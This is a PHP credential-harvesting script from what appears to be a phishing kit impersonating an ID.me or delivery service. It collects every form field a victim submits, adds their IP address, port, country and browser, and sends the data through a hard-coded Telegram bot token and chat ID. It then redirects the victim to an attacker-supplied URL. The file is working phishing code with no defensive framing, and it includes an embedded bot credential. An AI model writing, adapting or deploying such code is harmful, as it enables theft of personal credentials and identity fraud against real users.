<?php
require_once("config.php");

// Get visitor information
$country = getVisitorCountry();
$ip = getClientIP();
$port = getClientPort();
$browser = $_SERVER['HTTP_USER_AGENT'];
$addDate = date("D M d, Y g:i a");

// Build message
$message = "From Xmx Delivery Inc. ID.ME\n";
foreach ($_POST as $key => $value) {
    $message .= "$key: $value\n";
}
$message .= "User-IP: $ip\n";
$message .= "Port: $port\n";
$message .= "Country: $country\n\n";
$message .= "----------------------------------------\n";
$message .= "Date: $addDate\n";
$message .= "User-Agent: $browser\n";

// Send message to Telegram
sendTelegramMessage($message);

// Redirect to c.html
header("location: ".$_POST['redir']."");

// Function to get visitor country
function getVisitorCountry() {
    $ip = getClientIP();
    $ipData = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));

    return $ipData && $ipData->geoplugin_countryName ? $ipData->geoplugin_countryName : "Unknown";
}

// Function to get client IP address
function getClientIP() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];

    return filter_var($client, FILTER_VALIDATE_IP) ? $client : (filter_var($forward, FILTER_VALIDATE_IP) ? $forward : $remote);
}

// Function to get client port
function getClientPort() {
    return getenv("REMOTE_PORT");
}

// Function to send message to Telegram
function sendTelegramMessage($message) {
   	$botToken  = '5441790383:AAHZS3U3TKqx4l28EPk0pvdm8Ilhwnevqzs';// your telegram bottoken from bot father for 
	$chat_id  = ['1909641348'];// your telegram chat it from userinfobot
	
	
	$website="https://api.telegram.org/bot".$botToken;
	foreach($chat_id as $ch){
		$params=[
		  'chat_id'=>$ch, 
		  'text'=>$message,
		];
		$ch = curl_init($website . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
		curl_setopt($ch, CURLOPT_POST, 3);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);
	}
	return true;


    
}

?>
